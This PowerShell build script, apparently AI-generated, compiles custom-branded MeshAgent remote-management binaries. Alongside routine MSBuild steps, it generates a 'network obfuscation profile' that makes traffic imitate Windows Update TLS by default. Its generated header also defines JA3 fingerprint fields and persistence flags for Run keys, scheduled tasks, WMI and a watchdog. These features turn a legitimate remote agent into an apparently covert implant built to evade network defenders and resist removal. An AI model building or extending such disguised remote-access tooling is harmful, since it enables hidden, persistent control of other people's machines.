#Requires -Version 5.1
<#
.SYNOPSIS
    Build custom-branded MeshAgent binaries locally

.DESCRIPTION
    This script builds MeshService64.exe and MeshService.exe with custom Acme branding.
    Requires Visual Studio 2022 with C++ build tools installed.

.PARAMETER Configuration
    Build configuration (Release or Debug). Default: Release

.PARAMETER SkipClean
    Skip cleaning before build

.PARAMETER SkipTests
    Skip running tests after build

.EXAMPLE
    .\build.ps1
    Build both x64 and x86 Release binaries

.EXAMPLE
    .\build.ps1 -Configuration Debug
    Build Debug binaries

.NOTES
    Author: Generated with Claude Code
    Requires: Visual Studio 2022, Python 3.x
#>

[CmdletBinding()]
param(
    [Parameter()]
    [ValidateSet('Release', 'Debug')]
    [string]$Configuration = 'Release',

    [Parameter()]
    [switch]$SkipClean,

    [Parameter()]
    [switch]$SkipTests
)

$ErrorActionPreference = 'Stop'

# Configuration
$RepoRoot = $PSScriptRoot
$BrandingConfig = Join-Path $RepoRoot "branding_config.json"
$BrandingHeader = Join-Path $RepoRoot "meshcore\generated\meshagent_branding.h"
$MSBuildPath = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
$SolutionFile = Join-Path $RepoRoot "MeshAgent-2022.sln"
$ProjectFile = Join-Path $RepoRoot "meshservice\MeshService-2022.vcxproj"

# Output
$OutputX64 = Join-Path $RepoRoot "meshservice\Release\MeshService64.exe"
$OutputX86 = Join-Path $RepoRoot "meshservice\Release\MeshService.exe"

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  MeshAgent Custom Build Script" -ForegroundColor Cyan
Write-Host "  Configuration: $Configuration" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

#region Step 1: Validate Environment
Write-Host "[1/7] Validating build environment..." -ForegroundColor Green

if (-not (Test-Path $MSBuildPath)) {
    Write-Host "❌ MSBuild not found at: $MSBuildPath" -ForegroundColor Red
    Write-Host "Please install Visual Studio 2022 with C++ build tools" -ForegroundColor Yellow
    exit 1
}

if (-not (Test-Path $BrandingConfig)) {
    Write-Host "❌ Branding config not found: $BrandingConfig" -ForegroundColor Red
    exit 1
}

# Check Python
try {
    $pythonVersion = python --version 2>&1
    Write-Host "✅ Python found: $pythonVersion" -ForegroundColor Gray
} catch {
    Write-Host "❌ Python not found. Please install Python 3.x" -ForegroundColor Red
    exit 1
}

Write-Host "✅ Build environment validated" -ForegroundColor Gray
#endregion

#region Step 2: Generate Branding Headers
Write-Host "[2/7] Generating branding headers..." -ForegroundColor Green

$brandingScript = @'
import json
import os

# Load branding config
with open('branding_config.json', 'r') as f:
    config = json.load(f)

branding = config.get('branding', {})
network = config.get('network', {})

service_name = branding.get('serviceName', 'MeshAgent')
display_name = branding.get('displayName', 'Mesh Agent Background Service')
company_name = branding.get('companyName', '')
product_name = branding.get('productName', service_name)
description = branding.get('description', display_name)
binary_name = branding.get('binaryName', f'{service_name}.exe')
log_path = branding.get('logPath', 'C:/ProgramData/MeshAgent/logs')

endpoint = network.get('primaryEndpoint', '')
user_agent = network.get('userAgent', 'MeshAgent/1.0')

header = f'''/* Generated file - do not edit. */
#ifndef GENERATED_MESHAGENT_BRANDING_H
#define GENERATED_MESHAGENT_BRANDING_H

#undef MESH_AGENT_SERVICE_FILE
#define MESH_AGENT_SERVICE_FILE TEXT("{service_name}")
#undef MESH_AGENT_SERVICE_NAME
#define MESH_AGENT_SERVICE_NAME TEXT("{display_name}")
#undef MESH_AGENT_COMPANY_NAME
#define MESH_AGENT_COMPANY_NAME "{company_name}"
#undef MESH_AGENT_PRODUCT_NAME
#define MESH_AGENT_PRODUCT_NAME "{product_name}"
#undef MESH_AGENT_FILE_DESCRIPTION
#define MESH_AGENT_FILE_DESCRIPTION "{description}"
#undef MESH_AGENT_INTERNAL_NAME
#define MESH_AGENT_INTERNAL_NAME "{binary_name}"
#undef MESH_AGENT_COPYRIGHT
#define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
#undef MESH_AGENT_LOG_DIRECTORY
#define MESH_AGENT_LOG_DIRECTORY TEXT("{log_path}")

/* Optional network hints for future use */
#define MESH_AGENT_NETWORK_ENDPOINT "{endpoint}"
#define MESH_AGENT_NETWORK_SNI NULL
#define MESH_AGENT_NETWORK_USER_AGENT "{user_agent}"
#define MESH_AGENT_NETWORK_JA3 NULL

/* Persistence flags */
#define MESH_AGENT_PERSIST_RUNKEY 0
#define MESH_AGENT_PERSIST_TASK 0
#define MESH_AGENT_PERSIST_WMI 0
#define MESH_AGENT_PERSIST_WATCHDOG 1

#endif /* GENERATED_MESHAGENT_BRANDING_H */
'''

# Write to meshcore/generated/
os.makedirs('meshcore/generated', exist_ok=True)
with open('meshcore/generated/meshagent_branding.h', 'w') as f:
    f.write(header)

print('Generated branding header successfully')
print(f'Service: {service_name}')
print(f'Display: {display_name}')
print(f'Endpoint: {endpoint}')
'@

Set-Content -Path "$env:TEMP\generate_branding.py" -Value $brandingScript
Push-Location $RepoRoot
try {
    python "$env:TEMP\generate_branding.py"
    if ($LASTEXITCODE -ne 0) {
        throw "Branding header generation failed"
    }
} finally {
    Pop-Location
}

Write-Host "✅ Branding headers generated" -ForegroundColor Gray
#endregion

#region Step 2.5: Generate Network Obfuscation Profile
Write-Host "[2.5/7] Generating network obfuscation profile..." -ForegroundColor Green

# Check if TLS profile is specified in environment or config
$tlsProfile = $env:TLS_PROFILE
if (-not $tlsProfile) {
    $tlsProfile = "windows_update"  # Default to Windows Update profile
}

$networkProfileScript = Join-Path $RepoRoot "tools\generate_network_profile.py"
if (Test-Path $networkProfileScript) {
    try {
        $networkArgs = @(
            $networkProfileScript,
            "--config", $BrandingConfig,
            "--tls-profile", $tlsProfile,
            "--output-header", (Join-Path $RepoRoot "meshcore\generated\network_profile.h"),
            "--output-json", (Join-Path $RepoRoot "build\meshagent\generated\network_profile.json")
        )

        & python $networkArgs | Out-String | Write-Host

        if ($LASTEXITCODE -eq 0) {
            Write-Host "✅ Network profile generated (TLS: $tlsProfile)" -ForegroundColor Gray
        } else {
            Write-Host "⚠️  Network profile generation failed (continuing without)" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "⚠️  Network profile generation error: $_" -ForegroundColor Yellow
    }
} else {
    Write-Host "⚠️  Network profile generator not found (skipping)" -ForegroundColor Yellow
}
#endregion

#region Step 3: Fix Resource File
Write-Host "[3/7] Fixing resource file..." -ForegroundColor Green

$rcFile = Join-Path $RepoRoot "meshservice\MeshService.rc"
if (Test-Path $rcFile) {
    $rcContent = Get-Content -Path $rcFile -Raw
    if ($rcContent -match '#include\s+"afxres\.h"') {
        $rcContent = $rcContent -replace '#include\s+"afxres\.h"', '#include <windows.h>'
        Set-Content -Path $rcFile -Value $rcContent -NoNewline
        Write-Host "✅ Fixed afxres.h → windows.h" -ForegroundColor Gray
    } else {
        Write-Host "✅ Resource file already fixed" -ForegroundColor Gray
    }
}
#endregion

#region Step 4: Clean (Optional)
if (-not $SkipClean) {
    Write-Host "[4/7] Cleaning previous build..." -ForegroundColor Green

    $cleanDirs = @(
        "meshservice\Release",
        "meshservice\x64\OBJ",
        "Release"
    )

    foreach ($dir in $cleanDirs) {
        $fullPath = Join-Path $RepoRoot $dir
        if (Test-Path $fullPath) {
            Remove-Item -Path $fullPath -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Write-Host "✅ Clean completed" -ForegroundColor Gray
} else {
    Write-Host "[4/7] Skipping clean (as requested)" -ForegroundColor Yellow
}
#endregion

#region Step 5: Build x64
Write-Host "[5/7] Building MeshService x64..." -ForegroundColor Green

$buildArgs = @(
    $ProjectFile,
    "/p:Configuration=$Configuration",
    "/p:Platform=x64",
    "/p:WindowsTargetPlatformVersion=10.0",
    "/p:PlatformToolset=v143",
    "/m",
    "/v:minimal",
    "/t:Rebuild"
)

& $MSBuildPath $buildArgs

if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ x64 build failed with exit code $LASTEXITCODE" -ForegroundColor Red
    exit $LASTEXITCODE
}

if (-not (Test-Path $OutputX64)) {
    Write-Host "❌ x64 binary not found at: $OutputX64" -ForegroundColor Red
    exit 1
}

$x64Size = (Get-Item $OutputX64).Length
$x64SizeMB = [math]::Round($x64Size / 1MB, 2)
Write-Host "✅ x64 build completed: ${x64SizeMB} MB" -ForegroundColor Gray
#endregion

#region Step 6: Build x86
Write-Host "[6/7] Building MeshService x86..." -ForegroundColor Green

$buildArgs = @(
    $ProjectFile,
    "/p:Configuration=$Configuration",
    "/p:Platform=Win32",
    "/p:WindowsTargetPlatformVersion=10.0",
    "/p:PlatformToolset=v143",
    "/m",
    "/v:minimal",
    "/t:Rebuild"
)

& $MSBuildPath $buildArgs

if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ x86 build failed with exit code $LASTEXITCODE" -ForegroundColor Red
    exit $LASTEXITCODE
}

if (-not (Test-Path $OutputX86)) {
    Write-Host "❌ x86 binary not found at: $OutputX86" -ForegroundColor Red
    exit 1
}

$x86Size = (Get-Item $OutputX86).Length
$x86SizeMB = [math]::Round($x86Size / 1MB, 2)
Write-Host "✅ x86 build completed: ${x86SizeMB} MB" -ForegroundColor Gray
#endregion

#region Step 7: Verify & Test
Write-Host "[7/7] Verifying build outputs..." -ForegroundColor Green

# Calculate checksums
$x64MD5 = (Get-FileHash -Path $OutputX64 -Algorithm MD5).Hash
$x86MD5 = (Get-FileHash -Path $OutputX86 -Algorithm MD5).Hash

Write-Host ""
Write-Host "================================================================" -ForegroundColor Green
Write-Host "  BUILD SUCCESSFUL" -ForegroundColor Green
Write-Host "================================================================" -ForegroundColor Green
Write-Host ""
Write-Host "Outputs:" -ForegroundColor Cyan
Write-Host "  📦 MeshService64.exe: ${x64SizeMB} MB (MD5: $x64MD5)" -ForegroundColor White
Write-Host "  📦 MeshService.exe:   ${x86SizeMB} MB (MD5: $x86MD5)" -ForegroundColor White
Write-Host ""
Write-Host "Next steps:" -ForegroundColor Cyan
Write-Host "  1. Test binaries locally" -ForegroundColor White
Write-Host "  2. Commit binaries: git add meshservice/Release/*.exe" -ForegroundColor White
Write-Host "  3. Create release: git tag v1.0.0 && git push origin v1.0.0" -ForegroundColor White
Write-Host "  4. Or deploy manually: .\deploy.ps1" -ForegroundColor White
Write-Host ""

if (-not $SkipTests) {
    Write-Host "Running basic validation tests..." -ForegroundColor Yellow

    # Test 1: File size check
    if ($x64Size -lt 3000000 -or $x86Size -lt 3000000) {
        Write-Host "⚠️ Warning: Binary size smaller than expected" -ForegroundColor Yellow
    }

    # Test 2: PE header check
    try {
        $x64PE = Get-Content -Path $OutputX64 -Encoding Byte -TotalCount 2
        if ($x64PE[0] -eq 0x4D -and $x64PE[1] -eq 0x5A) {
            Write-Host "✅ x64 binary has valid PE header" -ForegroundColor Gray
        }
    } catch {
        Write-Host "⚠️ Could not validate PE headers" -ForegroundColor Yellow
    }

    Write-Host "✅ Basic validation passed" -ForegroundColor Gray
}

Write-Host ""
#endregion
